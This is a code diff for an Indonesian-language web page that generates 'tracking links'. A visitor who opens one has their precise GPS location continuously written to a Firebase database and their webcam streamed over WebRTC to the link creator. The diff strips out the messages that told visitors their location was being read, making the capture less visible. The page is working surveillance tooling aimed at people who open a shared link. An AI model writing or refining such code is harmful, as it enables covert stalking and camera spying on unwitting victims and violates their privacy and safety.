@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Tracking Link Live Location + Kamera</title>
+  <title>Tracking Kamera + Lokasi</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     body { background: #111; color: #eee; font-family: sans-serif; margin: 0; padding: 20px; }
@@ -18,9 +19,9 @@
   </style>
 </head>
 <body>
-<h1>Tracking Link Live Location + Kamera</h1>
+<h1>Tracking Kamera + Lokasi</h1>
 <div id="creator">
-  <button onclick="buatLink()">Buat Link Tracking</button>
+  <button onclick="buatLink()">Buat Link</button>
   <div id="linkOutput"></div>
   <ul id="linkList"></ul>
   <div id="map"></div>
@@ -71,19 +72,6 @@ function buatLink() {
 
 function renderLinks() {
   let links = JSON.parse(localStorage.getItem("links") || "[]");
-  const list = document.getElementById("linkList");
-  list.innerHTML = "";
-  links.forEach(id => {
-    const li = document.createElement("li");
-    li.textContent = `Link ID: ${id}`;
-    li.onclick = () => {
-      showMap(id);
-      listenVideo(id);
-    };
-    list.appendChild(li);
-  });
-
-  // Auto listen + map untuk semua link
   links.forEach(id => {
     showMap(id);
     listenVideo(id);
@@ -115,28 +103,22 @@ function listenVideo(id) {
   ref.child("offer").on("value", async snap => {
     const offer = snap.val();
     if (offer) {
-      console.log("Creator: received offer", offer);
       if (!peerConnection) setupCreatorPeer(ref);
       await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
       const answer = await peerConnection.createAnswer();
       await peerConnection.setLocalDescription(answer);
       ref.child("answer").set(answer);
-      console.log("Creator: sent answer", answer);
     }
   });
   ref.child("ice").on("child_added", snap => {
     const ice = snap.val();
-    if (ice) {
-      console.log("Creator: added ICE", ice);
-      peerConnection.addIceCandidate(new RTCIceCandidate(ice));
-    }
+    if (ice) peerConnection.addIceCandidate(new RTCIceCandidate(ice));
   });
 }
 
 function setupCreatorPeer(ref) {
   peerConnection = new RTCPeerConnection(rtcConfig);
   peerConnection.ontrack = e => {
-    console.log("Creator: received track");
     const video = document.createElement("video");
     video.autoplay = true;
     video.playsInline = true;
@@ -145,68 +127,43 @@ function setupCreatorPeer(ref) {
     document.getElementById("videoContainer").appendChild(video);
   };
   peerConnection.onicecandidate = e => {
-    if (e.candidate) {
-      ref.child("iceAnswer").push(e.candidate);
-      console.log("Creator: sent ICE", e.candidate);
-    }
-  };
-  peerConnection.oniceconnectionstatechange = () => {
-    console.log("ICE state: ", peerConnection.iceConnectionState);
+    if (e.candidate) ref.child("iceAnswer").push(e.candidate);
   };
 }
 
 function runVisitor(id) {
-  if (!navigator.geolocation || !navigator.mediaDevices.getUserMedia) {
-    document.getElementById("status").textContent = "Browser tidak mendukung fitur";
-    return;
-  }
   navigator.geolocation.watchPosition(pos => {
     db.ref("locations/" + id).set({
       lat: pos.coords.latitude,
       lng: pos.coords.longitude,
       time: Date.now()
     });
-    document.getElementById("status").textContent = `Lokasi: ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
   }, err => {
-    document.getElementById("status").textContent = "Gagal lokasi: " + err.message;
+    console.log("Gagal lokasi:", err.message);
   }, { enableHighAccuracy: true });
 
   navigator.mediaDevices.getUserMedia({ video: true, audio: false })
   .then(async stream => {
-    console.log("Visitor: got media stream");
     visitorPC = new RTCPeerConnection(rtcConfig);
     stream.getTracks().forEach(track => visitorPC.addTrack(track, stream));
     const ref = db.ref("videos/" + id + "/signal");
     visitorPC.onicecandidate = e => {
-      if (e.candidate) {
-        ref.child("ice").push(e.candidate);
-        console.log("Visitor: sent ICE", e.candidate);
-      }
+      if (e.candidate) ref.child("ice").push(e.candidate);
     };
     const offer = await visitorPC.createOffer();
     await visitorPC.setLocalDescription(offer);
     ref.child("offer").set(offer);
-    console.log("Visitor: sent offer", offer);
     ref.child("answer").on("value", async snap => {
       const answer = snap.val();
-      if (answer) {
-        console.log("Visitor: received answer", answer);
-        await visitorPC.setRemoteDescription(new RTCSessionDescription(answer));
-      }
+      if (answer) await visitorPC.setRemoteDescription(new RTCSessionDescription(answer));
     });
     ref.child("iceAnswer").on("child_added", snap => {
       const ice = snap.val();
-      if (ice) {
-        console.log("Visitor: added ICE", ice);
-        visitorPC.addIceCandidate(new RTCIceCandidate(ice));
-      }
+      if (ice) visitorPC.addIceCandidate(new RTCIceCandidate(ice));
     });
-    visitorPC.oniceconnectionstatechange = () => {
-      console.log("ICE state: ", visitorPC.iceConnectionState);
-    };
   })
   .catch(err => {
-    document.getElementById("status").textContent = "Gagal kamera: " + err.message;
+    console.log("Gagal kamera:", err.message);
   });
 }
 </script>
